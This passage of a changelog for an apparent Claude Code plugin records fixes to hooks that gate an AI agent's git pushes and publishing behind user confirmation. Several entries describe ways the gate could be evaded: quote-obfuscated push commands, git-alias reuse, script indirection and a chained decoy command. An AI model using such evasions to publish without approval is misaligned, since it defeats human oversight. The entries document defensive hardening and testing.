  user's own note that this project's CHANGELOG has a history of
  overclaiming.
- **`responsible-ai-reviewer` narrowed.** Previously fired on ANY Standard+
  AI feature — an opus-tier (priciest) role waking for a harmless
  AI-generated encouragement message added cost with no matching risk.
  Now scoped to AI features that make or meaningfully influence a real
  decision about a person.
- **Security (MAJOR, real deadlock, found live while publishing this very
  release): `confirm-publish.mjs`/`confirm-go-public.mjs` could never be
  run.** Both scripts' own filenames contain "publish"/"go-public", so
  invoking either via the Bash tool matched the generic "script whose name
  suggests deploy/release/publish/ship" indirection rule and was itself
  treated as push-capable — meaning `gate.mjs` denied the very command
  that RECORDS a user's publish confirmation, on the grounds that no
  confirmation was recorded yet. An unbreakable deadlock with no way to
  ever create the record. Fixed with a narrowly-scoped exemption (matches
  ONLY a plain `node <path-ending-in-one-of-these-two-scripts>
[one optional arg]` invocation with no chained commands anywhere in the
  string — verified a decoy like `git push origin main; node
confirm-publish.mjs` is still correctly caught, not exempted). Existing
  tests never caught this because they invoke the confirm scripts directly
  via `spawnSync` (bypassing the Bash-tool hook layer entirely) rather than
  through the actual PreToolUse interface; a new test exercises the real
  interface and locks the fix in (15 tests total).
- **README "31 AI roles" headline softened** to "The specialist team,"
  with the count moved into supporting text — a minor but real instance of
  number-forward framing cutting against this product's plain-language,
  non-overwhelming design ethos.

**Considered and explicitly declined**

- An independent audit flagged 4 of the 15 new v2.0.0 roles (`qa-lead`,
  `project-assistant`, `prompt-engineer`, `release-manager`) as likely
  duplicating `tester`, `memory-keeper`, `ai-developer`, and `publisher`
  respectively — the same "one job as two roles" pattern that sank an
  earlier 26-role tool. Asked directly; the user chose to keep all 31
  roles as-is. Not re-litigated further.

## 2.0.0 — 2026-07-11

A major gold-standard audit and expansion. Breaking only in the sense that
the specialist-role contract changed (the roster grew); every existing
project, command and skill continues to work unchanged.

**Added**

- **15 new specialist roles (16 → 31)**, the standard SDLC/AI specialist
  set, each Tier- or feature-gated so it only wakes when a project actually
  needs it (a Tiny site never loads them): `devops-engineer`,
  `sre-observability`, `release-manager`, `mlops-engineer`, `prompt-engineer`,
  `responsible-ai-reviewer`, `qa-lead`, `accessibility-specialist`,
  `ux-designer`, `technical-writer`, `data-engineer`, `privacy-dpo`,
  `localisation-specialist`, `researcher`, `project-assistant`. The `studio`
  skill's Tier table now has a companion "feature-triggered roles" table.
- **The `dev-memory` skill now exists.** It was referenced by five files
  (the studio skill, publish-github, memory-keeper, a command and a hook)
  but the `SKILL.md` had never been written — the headline "it remembers
  everything" feature had no defining document. Now it does.
- **`hooks/repo-integrity.mjs`** — a repository self-consistency check
  (referenced skills/hooks exist, role/skill counts match the README,
  versions agree, roster matches its baseline). This is the systemic fix
  for the class of bug above: CI now fails on a dangling reference, so a
  missing skill can't hide again.
- **`hooks/hooks.test.mjs`** — the first behavioural test suite for the
  security hooks (12 tests): the push-matcher catches real bypasses and
  allows ordinary reads; the scanner refuses planted secrets and the
  private Dev-Memory folder while ignoring look-alike code; the publish
  gate's two tokens are proven independent.
- **`plugins/gru953-studio/ROSTER.md`** — a committed roster baseline so the
  product's own role count is mechanically verifiable (previously
  `roster-check.mjs` could never pass on this repo, because the baseline
  lived only in a built project's Dev-Memory).
- Community-health pointer files under `.github/` (SECURITY, CONTRIBUTING,
  CODE_OF_CONDUCT) so GitHub discovers the canonical `governance/` versions;
  a `CODEOWNERS`; and a Dependabot config for the CI Actions.
- **Every role now declares a model deliberately** (6 haiku · 21 sonnet ·
  4 opus) instead of 12 roles inheriting the surface default — cheapest-first
  per `cost-guard`, with the tiers and reasoning recorded in
  `plugins/gru953-studio/ROSTER.md`. Existing opus/sonnet choices were left
  untouched; only the 12 unset roles were assigned.

**Fixed**

- **Security (fail-open risk): `lib.deny()` emitted invalid JSON** whenever a
  deny reason contained a quote, backslash or newline — which several of the
  gate's own reasons do. An unparseable PreToolUse deny risks not being
  honoured (failing open). Both `allow()` and `deny()` now build their
  output with `JSON.stringify`, so any reason is always correctly escaped.
  Caught by the new test suite.
- `roster-check.mjs` now falls back to the committed `ROSTER.md` when no
  per-project Dev-Memory baseline exists, so it works on the product repo.
- `publish-github` skill: removed a duplicated, mis-numbered "step 7" in
  section 5, and de-hardcoded the `v0.1.0`/`v1.0.0` version strings to a
  `<version>` placeholder set by the new `release-manager` role.
- CI: the DCO sign-off check now inspects only the commits introduced by
  the current push or pull request (merge commits exempt), instead of
  scanning all history — a single unsigned legacy or fork commit can no
  longer block every future change. CI also now runs the integrity check,
  the roster check and the behavioural test suite on every change.
- **Role-boundary sharpen (independent verification audit):**
  `ai-developer` still claimed prompt authoring as its own step, which
  duplicated the newly added `prompt-engineer`. It now delegates prompt
  authoring to `prompt-engineer` (drafting inline only when none is
  engaged, e.g. Tiny Tier) and keeps AI-justification, integration and the
  safety guardrails — closing the only genuine overlap the 16 → 31
  expansion introduced. A second, independent audit confirmed every other
  role boundary is distinct, no role is redundant, and every review-only
  role is correctly read-only.
- **Security (fail-open bypass in the push matcher):** `isPushCapable()`
  rated `git "push"`, `git 'push'` and `"git" push` as NON-push, so a
  quote-obfuscated push could have slipped past both the secret scan and the
  publish gate (failing open) — the opposite of the matcher's stated
  "prove non-push or treat as push" rule. The matcher now tolerates optional
  quotes around the `git` binary and the `push` subcommand. Found by an
  adversarial audit that ran the matcher against a battery of bypasses;
  a new `hooks.test.mjs` case locks it in, and the safe-command set was
  re-verified to confirm no new false positives.

## 1.0.2 — 2026-07-11

- **Licence changed again, from the GRU953 Community Licence 1.0 to the
  Polyform Noncommercial License 1.0.0**, following a critical audit
  requested by the user: a custom licence text, however well-intentioned,
  isn't machine-readable by GitHub's licence detector or dependency
  scanning tools, and creates a real adoption barrier. Same
  free-noncommercial/paid-commercial intent; `governance/` structure
  unchanged.
- README: added a full table of the 16 specialist roles and 6 skills;
  added a clear, honest statement that GRU953-Studio requires Claude Code
  and does not work in Claude Desktop (verified, not assumed — Desktop's
  only extension mechanism is MCP servers, with no equivalent to Claude
  Code's sub-agent spawning or hook system); added install-from-a-
  downloaded-zip instructions as an alternative to the marketplace command.
- Every GitHub Release now gets a downloadable `.zip` asset attached
  automatically as part of the publish protocol (`publish-github` skill),
  so non-technical users can install without typing marketplace commands.
  Retroactively attached to v1.0.0 and v1.0.1 as well.

## 1.0.1 — 2026-07-11

Found while archiving old repos using the freshly-published v1.0.0: the
`isPushCapable()` compound-command fallback treated ANY `gh` command
chained after a `cd` (e.g. `cd <dir> && gh repo view ...`) as push-capable
— including harmless reads (`gh repo view`, `gh auth status`, `gh api
user`). Since this environment's Bash tool doesn't reliably persist a
working directory, `cd <dir> && gh <command>` is the normal way to run
almost any `gh` command here, so this blocked ordinary use constantly.
Removed the fallback: every specific push-pattern regex already matches
anywhere in a compound string (unanchored `.test()`), so it added no real
detection power while causing this false-positive class.

## 0.1.0 — 2026-07-10

Initial plugin scaffold: 16 specialist agent roles (project-lead,
interviewer, architect, scope-guardian, builder, reviewer, tester,
security-compliance-auditor, brand-guardian, fixer, cut-recorder,
cost-monitor, publisher, memory-keeper, maintenance-agent, plus
ai-developer added during the gold-standard audit below), 6 skills
(studio, first-run, dev-memory, cost-guard, yagni-rules, publish-github),
3 commands, and security hooks adapted from the sibling GRU953-Crew
project's proven design.

Same-day gold-standard audit (multi-perspective review → fix loop) closed
before first publish:

- Retired the `minimalist` role (redundant with `reviewer`'s own
  whole-product trim pass) and added `ai-developer` in its place — net
  role count unchanged at 16, per this project's bounded-growth rule.
- Fixed a real security bug: `hooks/scan.mjs` could scan the wrong git
  tree in a multi-step publish sequence.
- Hardened `hooks/lib.mjs`'s push-command detection against a git-alias
  bypass and script/Makefile indirection.
- Added a separate, distinctly-tokened "go public" confirmation
  (`hooks/confirm-go-public.mjs`) so a private-publish confirmation can
  never also authorise making the repository public.
- Added real GitHub Release creation (tag + `gh release create` +
  `isDraft: false` verification) to the publish protocol — previously
  publishing stopped at a private repo push, the exact failure mode that
  affected every one of this project's ten predecessors.
- Replaced the internally-contradictory "Apache-2.0 + commercial
  restriction" licence with the Polyform Noncommercial License 1.0.0,
  which is designed for exactly this free-noncommercial/paid-commercial
  model.
- Added `hooks/verify-progress.mjs`, `SECURITY.md`, `CONTRIBUTING.md`,
  `CODE_OF_CONDUCT.md`, `NOTICE`, issue/PR templates, and a baseline CI
  workflow.

Rounds 2-4 of the same audit found and fixed further real issues:

- A residual git-alias-reuse bypass class (disclosed as a limitation in
  `SECURITY.md`, not fully closable with stateless per-command matching),
  plus `git send-pack`/`gh alias set` detection added to `hooks/lib.mjs`.
- Two agents (`scope-guardian`, `interviewer`) were missing the `Bash`
  tool their own instructions required — a real bug, fixed.
- The plan's own headline sentence, plus `memory-keeper.md`,
  `cost-monitor.md`, and `cost-guard/SKILL.md`, described a private
  GitHub backup mirror for Dev-Memory that was never built and directly
  conflicted with the security hooks. Asked directly, the user chose
  **local-only, no mirror** — every file corrected to match.
- The publish sequence would have self-blocked: the confirmation was
  recorded AFTER `gh repo create --private`, but the publish-gate hook
  denies that exact command unless confirmation already exists. Reordered
  in `publish-github/SKILL.md` and `publisher.md`.
- `security-compliance-auditor.md` undercounted its own checks ("three"
  instead of four) and didn't state its Publish-gate checks apply at
  every Tier, including Tiny — both corrected.
- `agents/project-lead.md` had unused Bash/Write/Edit tools (trimmed to
  Read/Grep/Glob, matching its actual delegate-only behaviour);
  `agents/cost-monitor.md` was missing Bash for a cheap file-size check
  (added).
- `first-run/SKILL.md`'s surface-detection had no deterministic order —
  given a fixed 3-step check sequence.
- A stale "Apache-2.0" reference survived in the plugin's own
  machine-readable `plugin.json` (the most consequential one, since
  tooling reads it) plus a few agent files — all corrected to match the
  Polyform Noncommercial licence actually in use.

Rounds 5-6 came back clean — the project's own "2 consecutive clean
rounds" convergence rule was satisfied before this version was published.

## Brand alignment (2026-07-11, before first publish)

Aligned the whole repository to the established GRU953 brand system (the
GRU953 Brand & Engineering Guidebook), rather than the generic choices made
during the audit:

- Licence changed again, from Polyform Noncommercial License 1.0.0 to the
  **GRU953 Community Licence 1.0** — the same licence used across every
  other GRU953 product. Same free-noncommercial/paid-commercial intent,
  now the brand's own licence instead of a third-party template.
- `LICENSE`, `NOTICE`, `CODE_OF_CONDUCT.md`, `CONTRIBUTING.md`,
  `SECURITY.md`, and new `TRADEMARKS.md`, `LOGO-USAGE.md`, `GOVERNANCE.md`
  moved into a `governance/` folder, matching the brand's established repo
  structure.
- Added the GRU953 logo to the README and a Community section linking the
  governance docs.
- Added a DCO 1.1 sign-off requirement (checked in CI) to match the
  brand's standing contribution policy — the publish protocol's orphan
  commit now carries a `Signed-off-by` trailer.

## Pre-publish live-fire finding (2026-07-11)

Running the actual secrets scanner against the real repository — not just
reviewing its regex in the abstract, as all 6 prior audit rounds did —
found a genuine false positive that would have permanently blocked
publishing: `SECRETVAR_RE` matched the hooks' own
`const token = crypto.createHash(...)` lines, because "token" + "=" +
16+ letters-and-a-dot ("crypto.createHash") satisfied the old pattern,
which allowed the secret VALUE to be unquoted. Fixed by requiring the
value to actually be a quoted string literal — a real secret is always a
literal, never a function call — which keeps every genuine detection
case working while eliminating this false-positive class entirely.
